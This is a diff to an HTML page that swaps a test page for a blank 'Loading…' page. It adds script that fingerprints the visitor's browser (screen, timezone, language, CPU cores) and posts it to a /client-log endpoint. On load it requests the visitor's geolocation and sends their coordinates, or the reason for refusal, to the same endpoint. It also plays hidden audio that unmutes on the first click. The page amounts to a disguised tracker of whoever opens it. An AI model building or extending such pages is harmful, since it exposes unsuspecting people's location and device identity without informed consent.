@@ -1,14 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Test</title>
+  <meta charset="UTF-8">
+  <title>Loading…</title>
 </head>
 <body>
-  <h1>Hello</h1>
+
+  <!-- subtle audio -->
+  <audio id="bg-audio" autoplay muted>
+    <source src="sound.mp3" type="audio/mpeg">
+  </audio>
 
   <script>
-    const data = {
-      screen: screen.width + "x" + screen.height,
+    // ===== BASIC CLIENT DATA =====
+    const baseData = {
+      screen: `${screen.width}x${screen.height}`,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       language: navigator.language,
       cores: navigator.hardwareConcurrency,
@@ -18,8 +24,44 @@
     fetch("/client-log", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
+      body: JSON.stringify(baseData)
     });
+
+    // ===== AUTO GEO PERMISSION =====
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          fetch("/client-log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              geo: "allowed",
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              acc: pos.coords.accuracy
+            })
+          });
+        },
+        err => {
+          fetch("/client-log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              geo: "denied",
+              reason: err.message
+            })
+          });
+        }
+      );
+    }
+
+    // ===== TRY UNMUTE AFTER FIRST INTERACTION =====
+    document.addEventListener("click", () => {
+      const audio = document.getElementById("bg-audio");
+      audio.muted = false;
+      audio.play().catch(() => {});
+    }, { once: true });
   </script>
+
 </body>
 </html>
